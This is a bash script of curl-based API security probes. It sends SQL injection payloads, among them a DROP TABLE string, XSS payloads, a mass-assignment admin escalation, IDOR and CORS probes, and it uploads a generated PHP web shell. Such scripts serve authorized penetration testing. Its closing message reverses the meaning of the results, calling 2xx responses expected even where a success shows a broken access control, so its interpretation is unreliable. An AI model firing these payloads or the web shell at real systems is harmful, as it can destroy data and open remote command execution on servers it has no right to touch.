#!/bin/bash

# API Security Testing Curl Templates
# Usage: ./api_security_tests.sh <BASE_URL>

BASE_URL=$1
if [ -z "$BASE_URL" ]; then
    echo "Usage: $0 <BASE_URL>"
    echo "Example: $0 https://api.example.com"
    exit 1
fi

echo "=== API Security Testing for $BASE_URL ==="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test 1: Authentication Bypass
echo -e "\n${YELLOW}Testing Authentication Bypass${NC}"

# Test without token
echo "Testing endpoint without authentication:"
curl -s -w "%{http_code}" "$BASE_URL/api/users" -o /dev/null
echo

# Test with invalid token
echo "Testing with invalid token:"
curl -s -H "Authorization: Bearer invalid_token" \
     -w "%{http_code}" \
     "$BASE_URL/api/users" \
     -o /dev/null
echo

# Test 2: Authorization Tests (IDOR)
echo -e "\n${YELLOW}Testing Authorization (IDOR)${NC}"

# Try to access another user's data
echo "Testing user access to other user's data:"
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     -w "%{http_code}" \
     "$BASE_URL/api/users/OTHER_USER_ID/orders" \
     -o /dev/null
echo

# Test 3: Input Validation
echo -e "\n${YELLOW}Testing Input Validation${NC}"

# SQL Injection payloads
SQL_PAYLOADS=("' OR '1'='1" "'; DROP TABLE users;--" "' UNION SELECT * FROM users--")

for payload in "${SQL_PAYLOADS[@]}"; do
    echo "Testing SQLi payload: $payload"
    curl -s -X POST \
         -H "Content-Type: application/json" \
         -d "{\"search\":\"$payload\"}" \
         -w "%{http_code}" \
         "$BASE_URL/api/search" \
         -o /dev/null
    echo
done

# XSS payloads
XSS_PAYLOADS=("<script>alert('XSS')</script>" "javascript:alert('XSS')" "<img src=x onerror=alert('XSS')>")

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "Testing XSS payload: $payload"
    curl -s -X POST \
         -H "Content-Type: application/json" \
         -d "{\"comment\":\"$payload\"}" \
         -w "%{http_code}" \
         "$BASE_URL/api/comments" \
         -o /dev/null
    echo
done

# Test 4: Rate Limiting
echo -e "\n${YELLOW}Testing Rate Limiting${NC}"

echo "Sending 10 rapid requests:"
for i in {1..10}; do
    response_code=$(curl -s -w "%{http_code}" "$BASE_URL/api/login" -o /dev/null)
    echo "Request $i: HTTP $response_code"
done

# Test 5: Mass Assignment
echo -e "\n${YELLOW}Testing Mass Assignment${NC}"

# Try to update admin fields
curl -s -X PUT \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"email":"user@example.com","role":"admin","verified":true}' \
     -w "%{http_code}" \
     "$BASE_URL/api/users/profile" \
     -o /dev/null
echo

# Test 6: File Upload Security
echo -e "\n${YELLOW}Testing File Upload${NC}"

# Create malicious file
echo '<?php system($_GET["cmd"]); ?>' > malicious.php

echo "Uploading PHP file:"
curl -s -X POST \
     -F "file=@malicious.php" \
     -w "%{http_code}" \
     "$BASE_URL/api/upload" \
     -o /dev/null
echo

# Clean up
rm -f malicious.php

# Test 7: API Versioning
echo -e "\n${YELLOW}Testing API Versioning${NC}"

# Test different API versions
for version in "v1" "v2" "v3"; do
    echo "Testing API version: $version"
    curl -s -w "%{http_code}" "$BASE_URL/$version/api/users" -o /dev/null
    echo
done

# Test 8: HTTP Methods
echo -e "\n${YELLOW}Testing HTTP Methods${NC}"

# Test unsupported methods
for method in "TRACE" "DEBUG" "OPTIONS"; do
    echo "Testing $method method:"
    curl -s -X "$method" \
         -w "%{http_code}" \
         "$BASE_URL/api/users" \
         -o /dev/null
    echo
done

# Test 9: CORS Configuration
echo -e "\n${YELLOW}Testing CORS Configuration${NC}"

echo "Testing CORS preflight:"
curl -s -X OPTIONS \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -w "%{http_code}\n" \
     "$BASE_URL/api/users" \
     -D - | grep -i "access-control"

# Test 10: Information Disclosure
echo -e "\n${YELLOW}Testing Information Disclosure${NC}"

# Test for error messages
curl -s "$BASE_URL/api/nonexistent" | grep -i "error\|exception\|stack trace"

echo -e "\n${GREEN}API Security Testing Complete${NC}"
echo "Review the HTTP status codes above - 2xx/3xx are expected, 4xx/5xx may indicate issues"